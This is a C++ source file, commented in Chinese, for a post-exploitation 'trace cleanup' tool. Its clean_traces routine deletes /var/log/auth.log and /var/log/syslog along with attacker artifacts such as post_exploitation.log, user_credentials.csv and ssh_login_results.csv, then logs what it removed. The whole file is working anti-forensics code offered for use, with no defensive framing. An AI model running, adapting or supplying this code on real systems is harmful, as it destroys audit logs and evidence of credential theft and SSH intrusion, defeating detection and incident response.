#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <chrono>
#include <iomanip>

namespace fs = std::filesystem;

class Cleanup {
public:
    Cleanup() {
        files_to_delete = {
            "/var/log/auth.log",    // 可选：身份验证日志
            "/var/log/syslog",      // 可选：系统日志
            "/path/to/your/script.log",  // 自定义路径，替换为实际路径
            "post_exploitation.log", // 后渗透日志
            "system_info.csv",      // 系统信息 CSV
            "user_credentials.csv",  // 用户凭据 CSV
            "ssh_login_results.csv",  // SSH 登录结果 CSV
        };
    }

    void delete_file(const std::string& filepath) {
        try {
            if (fs::exists(filepath) && fs::is_regular_file(filepath)) {
                fs::remove(filepath);
                log("成功删除文件: " + filepath);
                delete_results.push_back({filepath, "Deleted"});
            } else {
                log("文件不存在: " + filepath);
                delete_results.push_back({filepath, "Not Found"});
            }
        } catch (const std::exception& e) {
            log("删除文件时出错 " + filepath + "：" + e.what());
            delete_results.push_back({filepath, "Error - " + std::string(e.what())});
        }
    }

    void save_results_to_csv() {
        std::ofstream file("cleanup_results.csv");
        if (file.is_open()) {
            file << "File Path,Status\n";
            for (const auto& result : delete_results) {
                file << result.file_path << "," << result.status << "\n";
            }
            file.close();
            log("删除记录保存成功。");
        } else {
            log("保存删除记录到 CSV 文件时出错：无法打开文件。");
        }
    }

    void clean_traces() {
        log("开始清理系统痕迹...");
        for (const auto& filepath : files_to_delete) {
            delete_file(filepath);
        }
        save_results_to_csv();
        log("系统痕迹清理完成。");
    }

private:
    struct DeleteResult {
        std::string file_path;
        std::string status;
    };

    std::vector<std::string> files_to_delete;
    std::vector<DeleteResult> delete_results;

    void log(const std::string& message) {
        std::ofstream log_file("cleanup.log", std::ios_base::app);
        if (log_file.is_open()) {
            auto now = std::chrono::system_clock::now();
            auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch());
            auto time = std::chrono::system_clock::to_time_t(now);
            log_file << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S") << " - " << message << "\n";
            log_file.close();
        }
    }
};

int main() {
    Cleanup cleanup;
    cleanup.clean_traces();
    return 0;
}
